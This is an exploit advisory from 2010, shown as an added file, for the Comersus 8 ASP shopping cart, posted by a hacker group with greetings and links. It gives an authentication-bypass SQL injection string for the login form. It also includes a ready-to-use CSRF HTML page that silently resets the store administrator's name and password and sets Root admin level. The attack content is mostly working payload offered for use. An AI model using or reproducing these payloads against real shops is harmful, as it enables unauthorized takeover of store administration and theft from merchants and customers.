@@ -1,0 +1,93 @@
+# Exploit Title:SQL Injection and CSRF Vulnerability in Comersus 8 Shopping Cart
+# Version: Web Application
+# vendor :http://www.comersus.com/index.html
+# Date: 1 apr,2010
+# Author:Sid3^effects
+# Code :
+--------------------------------------------------------------------------------------
+#####################Sid3^effects aKa HaRi##################################
+#Greetz to all Andhra Hackers and ICW Memebers[Indian Cyber Warriors]
+#Thanks:*L0rd ÇrusAdêr*,d4rk-blu™®,R45C4L idi0th4ck3r,CR4C|< 008,M4n0j,MaYuR
+#ShouTZ:kedar,dec0d3r,41.w4r10r     
+#Catch us at www.andhrahackers.com or www.teamicw.in
+############################################################################
+ 
+Description :
+Top Rated free ASP Shopping Cart since year 2000 with Web Control Panel and StoreFront. Simple 3 Step Checkout, new template with CSS snippet based, SEO friendly, taxes, PayPal Standard, unlimited shipping rules, multilanguage, stock, RC4 encryption, auctions, reviews, order tracking, multilevel categories, digital goods distribution (serials, links, images, mp3). Optional Packs with Google Checkout, 2Checkout, PayPal Pro, UPS, USPS, DHL, SQL, mySQL, DES encryption, WAP catalog, YouTube Integration, sales forecasting, Java charts, Image Zoom, antifraud and more.
+
+
+############################################################################
+
+Xploit : (Auth Bypass) SQL Injection
+
+       
+ By using the combo ' or 1=1 or ''=' the attacker can login 
+
+
+############################################################################
+
+Xploit :  CSRF Vulnerability
+ 
+  The Comersus 8 Shopping Cart is vulnerable to CSRF.The attacker can modify the options which are available.
+
+DEMO : TO change the admin login details and other info..
+
+#################################################
+<html>
+<body>
+<title> Comersus 8 Shopping Cart CSRF ATTACK </title>
+<center>
+   <font face="courier new"size="6">
+        Comersus 8 Shopping Cart CSRF ATTACK
+          <br> www.andhrahackers.com
+ </center>
+<form method="post" name="modCust" action="http://server/backofficetest/backOfficePlus/comersus_backoffice_modifyUserForm.asp?idAdmin=14">
+  <table width="421" border="0">  
+      <tr> 
+      
+    </tr>
+    <tr> 
+      <td width="168">Name</td>
+      <td width="220">      
+        <input type=text name=Name value="hacker">
+      </td>
+    </tr>    
+ 
+    <tr> 
+      <td width="168"><strong>Password</strong></td>
+      <td width="220">         
+        <input type=text name=password value="pwned"> 
+        
+      </td>
+    </tr>
+    <tr> 
+           <td width="168">Store</td>
+      <td width="220">         
+        
+         <input type=text name=store value="English"> 
+   
+
+      </td>
+    </tr>
+    <tr> 
+      <td width="168">Admin Level</td>
+      <td width="220">         
+        <input type=text name=Adminlevel value="Root">
+      </td>
+    </tr>
+      <td width="168"> </td>
+      <td width="220"> </td>
+    </tr>
+    <tr> 
+      <td colspan="2">        
+          <input type="submit" name="Modify" value="Modify">                            
+      </td>
+    </tr>
+    </table>
+   </form>      
+</body>    
+</html>
+               
+###########################################################################################
+
+#Sid3^effects
